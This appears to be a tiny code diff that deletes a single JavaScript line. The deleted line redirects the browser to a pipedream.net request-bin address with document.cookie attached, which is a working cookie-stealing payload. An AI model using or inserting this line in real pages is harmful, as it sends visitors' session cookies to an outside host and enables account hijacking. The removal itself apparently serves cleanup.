@@ -1,1 +1,0 @@
-window.location.href = "https://en32ycoo3ucod.x.pipedream.net/?cookie=".concat(document.cookie);
